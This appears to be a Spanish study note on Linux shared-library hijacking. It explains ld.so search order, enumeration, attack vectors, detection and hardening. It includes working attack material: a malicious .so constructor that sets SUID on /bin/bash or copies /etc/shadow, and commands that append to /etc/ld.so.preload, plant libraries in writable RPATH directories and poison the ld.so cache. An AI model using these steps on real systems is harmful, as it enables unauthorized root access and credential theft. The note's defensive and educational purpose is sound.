---
tags:
  - ciberseguridad
  - escalada
  - secuestro-compartidas
tipo: concepto
estado: terminado
---

# Secuestro de Bibliotecas Compartidas (Shared Library Hijacking)

Las **bibliotecas compartidas** (`.so`) se resuelven **en tiempo de ejecución** por el cargador dinámico `ld.so`, recorriendo una lista fija de rutas en un orden determinado. Si el atacante controla **un directorio que aparece antes** que la librería legítima — o los mecanismos de preload —, su `.so` se carga **con los privilegios del proceso víctima** y su código corre dentro de él (constructores incluidos). A diferencia de Python o `PATH`, aquí el buscador es parte del ABI del sistema y **ignora el entorno en contextos privilegiados** (secure-execution), lo que define todo el mapa de ataque.

> [!info] Mecanismo de enlace dinámico
> Un binario dinámico no contiene el código de `libc`: en su cabecera lleva `PT_INTERP` (p. ej. `/lib64/ld-linux-x86-64.so.2`) y una lista `DT_NEEDED` con los **sonames** que necesita (`libc.so.6`, `libssl.so.3`). Al ejecutarlo, el kernel carga el intérprete y le pasa el control; `ld.so` carga sus dependencias, aplica reubicaciones (GOT/PLT) y resuelve símbolos — **lazy binding** por defecto: la primera llamada a una función externa se resuelve en ese momento. Ese "resolver en el momento" es la ventana donde manda el orden de búsqueda.

## Mecánica: orden de búsqueda exacto (ld.so(8))

Para cada `DT_NEEDED`, y también para cada entrada de `LD_PRELOAD` (procesado **antes** que todo lo demás):

| Paso | Fuente | Notas |
|---|---|---|
| 1 | **`DT_RPATH`** del binario | deprecado; **se ignora si existe `DT_RUNPATH`** |
| 2 | **`LD_LIBRARY_PATH`** | variable del entorno; **ignorada en modo seguro** (SUID/SGID/file-caps/`AT_SECURE`) |
| 3 | **`DT_RUNPATH`** del binario | moderno; aplica solo a *las dependencias de ese objeto*, no transitivo |
| 4 | **`/etc/ld.so.cache`** | caché generada por `ldconfig` desde `/etc/ld.so.conf` + `/etc/ld.so.conf.d/*` |
| 5 | **Rutas por defecto** compiladas en el cargador | `/lib`, `/usr/lib` y multiarch (`/lib/x86_64-linux-gnu`…) |

Además:

- **`LD_PRELOAD`**: lista de `.so` a cargar al arrancar **antes** que cualquier `DT_NEEDED`. En modo seguro solo se aceptan entradas **sin `/`** que estén en rutas estándar del sistema — por eso *tu* librería en `/tmp` **nunca** se precarga en un binario SUID.
- **`/etc/ld.so.preload`**: archivo leído **siempre** por el cargador, **también en modo seguro**, sin comprobaciones de entorno. Una línea con una ruta de `.so` = todos los procesos (incluidos SUID) la cargan. **Escritura en él = root.**
- **Modo seguro (`AT_SECURE`)**: se activa si `ruid != euid`, `rgid != egid`, o el binario tiene SUID/SGID/file capabilities. Desactiva `LD_PRELOAD` con rutas, `LD_LIBRARY_PATH`, `LD_DEBUG` de escritura, etc.
- **Constructores**: `__attribute__((constructor))` de tu `.so` se ejecuta **en el `dlopen`/carga**, antes de `main()` — el payload típico no necesita esperar a que el programa llame a nada.

```bash
# Ver qué cargador y qué dependencias tiene un binario
readelf -l bin | grep -A1 INTERP        # PT_INTERP → /lib64/ld-linux-x86-64.so.2
readelf -d bin | grep -E 'NEEDED|RPATH|RUNPATH'
objdump -p bin | grep -E 'NEEDED|RPATH|RUNPATH'   # alternativa sin ejecutar nada
patchelf --print-rpath bin; patchelf --print-needed bin
```

## Enumeración: encontrar el vector

```bash
# 1) Dependencias y rutas de un binario (¿"not found"? ¿RPATH raro?)
ldd /usr/local/bin/programa
#   libfoo.so.1 => not found          ← candidato: ¿dónde la buscará? ¿dir escribible?
#   libbar.so => /tmp/libs/libbar.so  ← RPATH a /tmp = P1
#  (ver recuadro sobre seguridad de ldd más abajo)

# 2) RPATH/RUNPATH declarados — la pista #1
for b in /usr/local/bin/* /opt/*/*; do
  readelf -d "$b" 2>/dev/null | grep -E 'RPATH|RUNPATH' | grep -q . && echo "== $b" \
    && readelf -d "$b" | grep -E 'RPATH|RUNPATH'
done
#  rutas relativas, con $ORIGIN y dirs escribibles = explotable
#  $ORIGIN = dir del binario → si el binario o su dir son escribibles: plantar .so al lado

# 3) LD_LIBRARY_PATH de procesos en marcha (servicios no privilegiados)
tr '\0' '\n' < /proc/<pid>/environ | grep '^LD_'
systemctl show <svc> -p Environment,EnvironmentFile

# 4) Directorios en caché/config que sean escribibles
grep -Rhs . /etc/ld.so.conf /etc/ld.so.conf.d/ | grep -v '^#'
#  ¿alguna ruta de ld.so.conf.d escribible? → ldconfig como root = incorpora TU dir a la caché
for d in $(grep -rh '^\s*/' /etc/ld.so.conf.d/* 2>/dev/null); do test -w "$d" && echo "WRITABLE CACHEDIR: $d"; done

# 5) Archivos críticos
ls -la /etc/ld.so.preload /etc/ld.so.cache /etc/ld.so.conf
#  /etc/ld.so.preload que existe en una instalación base → sospechoso por sí mismo

# 6) .so no pertenecientes a paquetes en rutas estándar
ls -la /usr/lib/*.so* /usr/local/lib/*.so* | head -50
dpkg -S /usr/lib/x86_64-linux-gnu/libc.so.6   # comprobar procedencia de librerías dudosas
```

### Triage

| Hallazgo | Nivel |
|---|---|
| `/etc/ld.so.preload` escribible (o ya con línea desconocida) | **P1 — root inmediato** |
| RPATH/RUNPATH con dir escribible (incl. `$ORIGIN` con binario/dir escribibles) | **P1** si el binario lo ejecuta root |
| Ruta de `ld.so.conf.d` escribible + posibilidad de correr `ldconfig` (o que lo corra root periódicamente) | **P1** |
| `LD_LIBRARY_PATH` con dir escribible en servicio no-privileged | **P2** — ejecución como ese usuario |
| `.so` faltante ("not found") en app propietaria con dir de búsqueda escribible | **P2** |
| Binario root con `RPATH` relativo (`libs/`, `.`) | **P1** |

## Construcción de una `.so` maliciosa

```c
// evil.c — payload en el constructor: corre en la carga, antes de main()
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void pwn(void) {
    if (geteuid() == 0) {          // solo si el proceso es privilegiado
        setuid(0); setgid(0);
        system("chmod u+s /bin/bash");
        // o exfiltrar: system("cp /etc/shadow /tmp/; chmod 644 /tmp/shadow");
    }
}
```

```bash
gcc -shared -fPIC -o libfuncion.so evil.c     # -shared: .so ; -fPIC: código reubicable (obligatorio)
#  si falla con "relocation R_X86_64_32 against ... can not be used" → faltó -fPIC
```

**Interposición de símbolos** (sobrescribir una función de la librería legítima):

```c
#define _GNU_SOURCE
#include <sys/types.h>
// El binario llama getuid() → resuelve AQUÍ primero (definición gana en la búsqueda)
uid_t getuid(void)  { return 0; }
uid_t geteuid(void) { return 0; }
```

```bash
LD_PRELOAD=./libfuncion.so ./programa       # solo procesos NO privilegiados
#  el binario ve getuid()==0: evasión de chequeos (comerciales/licencias/sandbox), no root OS
```

> [!warning] Interponer ≠ escalar
> `LD_PRELOAD` cambiando `getuid()` engaña al **programa**, no al kernel: sigues con los mismos permisos reales. La escalada real ocurre cuando **un proceso privilegiado carga tu `.so`** (RPATH/`ld.so.preload`/`LD_LIBRARY_PATH` de un servicio) — ahí el constructor corre con su EUID.

## Vectores de ataque (de mayor a menor impacto)

### 1) `/etc/ld.so.preload` escribible → root universal

```bash
test -w /etc/ld.so.preload || echo "/tmp/libevil.so" >> /etc/ld.so.preload
# o crearlo si no existe (implica escritura en /etc — ya ≈ root)
gcc -shared -fPIC -o /tmp/libevil.so evil.c
# el próximo exec de cualquier binario (bash, sudo, login) carga /tmp/libevil.so
```

### 2) RPATH/RUNPATH a dir escribible (o `$ORIGIN` con dir escribible)

```bash
readelf -d /opt/app/servicio | grep RUNPATH
#  RUNPATH=$ORIGIN/../lib  y  /opt/app/lib es group-writable
gcc -shared -fPIC -o /opt/app/lib/libssl.so.3 evil.c   # misma versión/soname buscada
systemctl restart servicio      # servicio (root) carga TU constructor
```

### 3) `LD_LIBRARY_PATH` del servicio con ruta escribible

```bash
# unit: Environment=LD_LIBRARY_PATH=/opt/libs:/usr/lib  con /opt/libs escribible
gcc -shared -fPIC -o /opt/libs/libcurl.so.4 evil.c
systemctl restart <svc>     # payload como usuario del servicio
```

### 4) Biblioteca faltante ("not found") + dir de búsqueda controlado

Aplicaciones propietarias que arrancan con `libfoo.so.x => not found`: el loader sigue su orden (paso 4→5). Si el directorio que *sí* se busca es escribible (o la caché lo apunta a uno), soltar la `.so` con el **soname exacto** resuelve el arranque… con tu código dentro.

### 5) Caché: ruta escribible en `ld.so.conf.d` + `ldconfig`

```bash
# Si puedes escribir /etc/ld.so.conf.d/ (o convencer a root/pkg de correr ldconfig):
echo "/tmp/evil" > /etc/ld.so.conf.d/evil.conf && ldconfig
# /tmp/evil/libc.so.6 (u otra librería buscada) → gana posición en /etc/ld.so.cache
#  ldconfig corre en cada arranque y en hooks de paquetes → vector diferido
```

### 6) Looney Tunables (CVE-2023-4911) — vulnerabilidad del propio cargador

Buffer overflow en el procesamiento de `GLIBC_TUNABLES` **en binarios SUID** (propio `ld.so`): `GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=…` → root. Muestra la clase entera: el cargador es parte del TCB y sus bugs aplican **especialmente** en contexto privilegiado. Ver [[Vulnerabilidades del Kernel y Escalada de Privilegios]] para el flujo de explotación de CVEs locales y [[Privilegios SUID en Linux]] para la superficie SUID.

## Trazado: `ldd`, `LD_DEBUG` y rastreo de ejecución

```bash
ldd /usr/bin/programa          # mapa resuelto de librerías (¿not found?, ¿rutas raras?)
LD_DEBUG=libs /usr/bin/ping    # salida cruda del cargador: qué dirs prueba, qué gana
LD_DEBUG=files,libs,symbols output=/tmp/ld.log /usr/bin/programa   # log ordenado
LD_TRACE_LOADED_OBJECTS=1 /usr/bin/programa   # lo que internamente hace ldd (sin "ejecutar" del todo)
strace -e trace=openat,open /usr/bin/programa 2>&1 | grep '\.so'   # aperturas reales
# uftrace: trazar llamadas a funciones de C/C++ y ver de qué .so salen (ver recuadro)
```

> [!warning] `ldd` sobre binarios no confiables
> `ldd` históricamente ejecuta (vía el cargador) el binario analizado: con ELF hostiles ha habido ejecución arbitraria (el cargador resuelve y el binario puede manipular reubicaciones). Regla de laboratorio: contra binarios de terceros usar **`objdump -p` / `readelf -d` / `LD_TRACE_LOADED_OBJECTS=1` con binario aislado**, no `ldd` a ciegas.

> [!tip] Uftrace (análisis de flujo de funciones)
> Para ver *qué función de qué librería* llama el programa y en qué orden — útil para decidir qué interponer:
> - Repo: https://github.com/namhyung/uftrace
> - Uso mínimo: `uftrace -A 'malloc@{arg0}' -R 'free@{}' ./programa` o `uftrace record ./prog && uftrace report`
>
> En el laboratorio **AttackDefense** (https://attackdefense.com) hay retos de secuestro de `.so` aplicando exactamente este flujo: rastrear dependencias → localizar dir de búsqueda controlado → plantar `.so` con constructor.

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| `/etc/ld.so.preload` creado/modificado | **FIM crítico**: alerta en cualquier diff de `/etc/ld.so.preload` (AIDE/Tripwire/osquery) |
| Ejecución de `ldconfig` fuera de paquetes | `ausearch -k ldconfig` (exec de `/sbin/ldconfig`); diffs de `/etc/ld.so.cache` |
| `.so` nuevo en rutas de caché | FIM sobre `/usr/lib*`, `/usr/local/lib*`; paquetes sin procedencia (`dpkg -S` vacío) |
| `LD_PRELOAD`/`LD_LIBRARY_PATH` en procesos | osquery `process_events`: entorno con rutas de usuario/`/tmp` en procesos de servicio |
| Carga de `.so` desde dir no estándar | EDR: `mmap`/`openat` de `*.so` bajo `/tmp`, `/home`, `/dev/shm` |
| RPATH modificado en binarios | `debsums -c` / `rpm -Va`; FIM sobre ELF de sistema (`readelf -d` en baseline) |
| Constructores en libs del sistema | análisis forense: secciones `.init_array` inesperadas en librerías de paquete |

Artefactos del ataque: `gcc -shared` en history, `.so` recién creadas junto a binarios, entrada nueva en `/etc/ld.so.conf.d/`, `/etc/ld.so.preload` con rutas a `/tmp`, caché re-generada fuera de actualizaciones.

## Impacto

- **Root total**: `/etc/ld.so.preload` o `ld.so.conf.d`+`ldconfig` → constructor en ejecuciones de root (login, cron, sudo).
- **Usuario del servicio**: RPATH/`LD_LIBRARY_PATH` de daemon → shell como `www-data`, `postgres`, app user → base para lateral/escalada (cron, SUID, kernel: [[Detección y Explotación de Tareas Cron]], [[Privilegios SUID en Linux]]).
- **Evasión/ingeniería inversa**: interposición de `getuid`, `fopen`, `strcmp` en bins no privilegiados (licencias, anticheats, sandboxing).
- **Info**: constructor que copia `~/.ssh`, entorno, tokens antes de delegar al comportamiento original.

## Sección defensiva: endurecimiento

```bash
# 1) Archivos del cargador: dueños y permisos duros
ls -la /etc/ld.so.preload /etc/ld.so.cache /etc/ld.so.conf.d/*
#  /etc/ld.so.preload: 0644 root:root (o INEXISTENTE); /etc: root-only writable

# 2) Sin RPATH escribible ni relativo en binarios de sistema
readelf -d /usr/local/bin/* 2>/dev/null | grep -E 'RPATH|RUNPATH'
patchelf --remove-rpath bin        # o corregir a rutas absolutas controladas

# 3) Config de caché saneada
grep -Rhs . /etc/ld.so.conf.d/     # solo rutas root-owned 755
#  y no incluir dirs de usuario ni /tmp

# 4) Entorno de servicios limpio (systemd)
[Service]
Environment=            # sin LD_* heredadas
#  los units de sistema ya ignoran LD_* heredados en la mayoría de configs — verificar:
systemctl show <svc> -p Environment

# 5) Confianza en modo seguro (ya activo por defecto)
#  SUID/SGID/file-caps → AT_SECURE ignora LD_PRELOAD/LD_LIBRARY_PATH del usuario.
#  Mantener el bit SUID mínimo (ver [[Privilegios SUID en Linux]]) y NoNewPrivileges
#  en servicios que no necesitan elevarse.

# 6) Detección continua
auditctl -w /etc/ld.so.preload -p wa -k preload_write
auditctl -w /etc/ld.so.conf.d -p wa -k ldconf_write
auditctl -a always,exit -F arch=b64 -S execve -F exe=/sbin/ldconfig -k ldconfig_run

# 7) Integridad de binarios/librerías
debsums -c / rpm -Va                      # suma de verificación de paquetes
#  Firmado y medición: IMA/EVM (ima_policy=appraisal) verifican hashes de .so al cargar;
#  en entornos endurecidos, bibliotecas firmadas por la distro + Secure Boot/PCR = la
#  "signed libs" práctica — un .so que no esté en el manifiesto medido no se carga.
```

## Errores comunes

1. **Esperar que `LD_PRELOAD` funcione sobre SUID** — modo seguro lo ignora (tu `.so` en `/tmp` jamás carga; solo vía `/etc/ld.so.preload` o rutas estándar). Falso negativo clásico al "probar" el ataque.
2. **Falta `-fPIC`** — error de linking al construir la `.so`; sin `-shared` produces un ejecutable, no una librería.
3. **Nombre/soname equivocado** — el loader busca **el string** que declara la app (`libfoo.so.1`): `libfoo.so` sin versión no matchea. Copiar con `ln -s` o renombrar exactamente.
4. **Olvidar `ldconfig`** — añadir la librería a un dir de la caché sin regenerarla no cambia nada: la caché es el paso 4 real.
5. **Arquitectura distinta** — `wrong ELF class: ELFCLASS32` / `undefined symbol: foo, version GLIBC_2.34 not defined`: compilaste para otra arch o tu `.so` no trae las versiones de símbolo que pide la app (para hooks, usar el mecanismo de *versioned symbols* o interceptar en la app, no en libc).
6. **`RPATH` vs `RUNPATH`** — si hay `RUNPATH`, el `DT_RPATH` (paso 1) **se ignora**; analizar los dos pero saber cuál manda.
7. **Asumir que "not found" es explotable** — el loader no cae a directorios arbitrarios: sin una ruta de los pasos 1–5 controlable, solo produce fallo de arranque.
8. **Interposición que no engancha**: `-Bsymbolic`/`RTLD_DEEPBIND` en la app o librería evitan que tu símbolo gane; además `getuid` de la **app** no cambia el resultado de `id` real — es engaño a nivel de programa.
9. **`ldd` a binarios de terceros** — puede ejecutar código; usar `readelf`/`objdump`.
10. **Estáticas** — `file: statically linked` no usa `ld.so`: ningún vector de esta nota aplica.

## Cheatsheet

```bash
# Enumeración
ldd /ruta/binario                                  # deps resueltas / not found
readelf -d bin | grep -E 'NEEDED|RPATH|RUNPATH'    # dependencias y rutas de búsqueda
readelf -l bin | grep INTERP                       # cargador dinámico
tr '\0' '\n' < /proc/<pid>/environ | grep '^LD_'   # LD_* de servicios
grep -Rhs . /etc/ld.so.conf.d/ && ls -la /etc/ld.so.preload
LD_DEBUG=libs,users ./binario                      # qué prueba el cargador

# Ataque (lab)
gcc -shared -fPIC -o libevil.so evil.c             # constructor → payload en la carga
LD_PRELOAD=./libevil.so ./prog                     # solo sin privilegios
echo "/tmp/libevil.so" >> /etc/ld.so.preload       # root universal (si es escribible)
# RPATH: plantar lib con soname exacto en el dir declarado → reiniciar servicio
# caché: ruta en ld.so.conf.d + ldconfig

# Defensa
ls -la /etc/ld.so.preload /etc/ld.so.cache
auditctl -w /etc/ld.so.preload -p wa -k preload_write
debsums -c; patchelf --remove-rpath
```

## Referencias

- `ld.so(8)` — orden de búsqueda, modo seguro, `LD_PRELOAD`, `/etc/ld.so.preload`: https://man7.org/linux/man-pages/man8/ld.so.8.html
- `ldconfig(8)` — generación de `/etc/ld.so.cache`: https://man7.org/linux/man-pages/man8/ldconfig.8.html
- HackTricks — Linux privilege escalation (library hijacking): https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- uftrace: https://github.com/namhyung/uftrace
- AttackDefense (retos de lab): https://attackdefense.com
- CVE-2023-4911 (Looney Tunables): https://nvd.nist.gov/vuln/detail/CVE-2023-4911
- Notas internas: [[Linux Capabilities]], [[Privilegios SUID en Linux]], [[PATH Hijacking]]

## Relacionadas

- [[PATH Hijacking]] — mismo patrón de "primer acierto gana", un nivel más abajo (shell vs cargador)
- [[Linux Capabilities]] — por qué los binarios con caps ignoran el entorno (`AT_SECURE`)
- [[Privilegios SUID en Linux]] — los binarios donde el modo seguro hace imposible el preload directo
- [[Vulnerabilidades del Kernel y Escalada de Privilegios]] — CVEs locales (incl. del propio `ld.so`) y su explotación
- [[Explotación de Servicios Internos]] — servicios con `LD_LIBRARY_PATH`/RPATH configurables
- [[Abuso de Permisos en Linux y LSE]] — dónde encaja la revisión de `.so`/RPATH en la enumeración
